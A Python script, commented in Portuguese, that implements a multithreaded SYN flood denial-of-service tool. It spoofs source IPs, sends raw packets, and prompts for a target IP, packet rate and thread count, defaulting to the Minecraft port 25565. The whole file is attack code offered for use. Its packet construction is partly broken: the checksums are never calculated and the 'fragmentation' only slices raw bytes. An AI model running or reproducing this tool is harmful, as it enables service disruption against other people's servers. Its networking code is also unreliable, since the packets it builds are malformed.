import random
import socket
import time
import threading
from faker import Faker
import struct

# Função para gerar IPs falsos
fake = Faker()

# Função para criar o cabeçalho TCP
def criar_cabecalho_tcp(source_ip, dest_ip, source_port, dest_port):
    # Cabeçalho TCP (sem dados, apenas campos obrigatórios)
    seq_num = random.randint(0, 65535)  # Número de sequência aleatório
    ack_num = 0  # Não estamos no estágio de ACK
    data_offset = 5  # Tamanho do cabeçalho TCP
    flags = 2  # Flag SYN (0x02)
    window_size = socket.htons(5840)  # Tamanho da janela de recepção
    checksum = 0  # Vamos calcular o checksum depois
    urgent_pointer = 0

    # Estrutura do cabeçalho TCP
    tcp_header = struct.pack(
        "!HHLLBBHHH", 
        source_port, dest_port, seq_num, ack_num, 
        data_offset << 4, flags, window_size, checksum, urgent_pointer
    )
    return tcp_header

# Função para criar o cabeçalho IP
def criar_cabecalho_ip(source_ip, dest_ip, fragment_offset=0):
    version = 4
    ihl = 5
    tos = 0
    tot_len = 0  # Tamanho total, vai ser preenchido depois
    id = random.randint(1, 65535)  # Identificador do pacote
    frag_off = fragment_offset  # Offset de fragmentação
    ttl = 255  # Time to live (TTL)
    protocol = socket.IPPROTO_TCP  # Protocolo para TCP
    check = 10  # Checksum (só vai ser calculado depois)
    source_address = socket.inet_aton(source_ip)  # IP origem
    dest_address = socket.inet_aton(dest_ip)  # IP destino
    ihl_version = (version << 4) + ihl

    # Estrutura do cabeçalho IP
    ip_header = struct.pack(
        "!BBHHHBBH4s4s", 
        ihl_version, tos, tot_len, id, frag_off, ttl, protocol, check, 
        source_address, dest_address
    )
    return ip_header

# Função para fragmentar pacotes em partes menores
def fragmentar_pacote(pacote, tamanho_fragmento):
    # Dividir o pacote em fragmentos de `tamanho_fragmento` bytes
    return [pacote[i:i + tamanho_fragmento] for i in range(0, len(pacote), tamanho_fragmento)]

# Função para enviar pacotes SYN fragmentados e falsificados com login falso
def enviar_syn_flood(ip, porta, pacotes_por_segundo):
    while True:
        ip_falsificado = fake.ipv4()  # Gera IP falso
        login_falso = fake.user_name()  # Gera um login falso

        # Cabeçalho IP
        ip_header = criar_cabecalho_ip(ip_falsificado, ip)

        # Cabeçalho TCP
        source_port = random.randint(1024, 65535)  # Porta de origem aleatória
        tcp_header = criar_cabecalho_tcp(source_ip=ip_falsificado, dest_ip=ip, source_port=source_port, dest_port=porta)

        # Construir o pacote final e fragmentá-lo
        pacote = ip_header + tcp_header
        fragmentos = fragmentar_pacote(pacote, tamanho_fragmento=16)  # Fragmentar em blocos de 16 bytes

        # Enviar os fragmentos do pacote SYN
        try:
            # Criar o socket RAW
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)

            for fragmento in fragmentos:
                sock.sendto(fragmento, (ip, porta))
                print(f"Fragmento SYN enviado para {ip} com IP Falsificado {ip_falsificado} e Login Falso {login_falso}")

            # Forçar o servidor a esperar, com a falta de resposta
            time.sleep(0.1)  # Espera forçada

        except socket.error as e:
            print(f"Erro ao enviar SYN para {ip}: {e}")

        finally:
            sock.close()  # Fechar o soquete

        # Controlar a quantidade de pacotes por segundo
        time.sleep(1 / pacotes_por_segundo)

# Função para iniciar o ataque com múltiplas threads
def iniciar_ataque(ip, porta, pacotes_por_segundo, num_threads):
    threads = []

    for _ in range(num_threads):
        thread = threading.Thread(target=enviar_syn_flood, args=(ip, porta, pacotes_por_segundo))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

if __name__ == '__main__':
    # Input do usuário para personalização do ataque
    ip_servidor = input("Digite o IP do servidor (ex: 127.0.0.1): ")  # IP do servidor
    porta_servidor = int(input("Digite a porta do servidor (padrão 25565 para Minecraft): "))  # Porta do servidor
    pacotes_por_segundo = int(input("Digite o número de pacotes por segundo (ex: 300): "))  # Pacotes por segundo
    num_threads = int(input("Digite o número de threads (ex: 10): "))  # Número de threads para enviar pacotes em paralelo

    # Inicia o ataque com os parâmetros fornecidos
    iniciar_ataque(ip_servidor, porta_servidor, pacotes_por_segundo, num_threads)
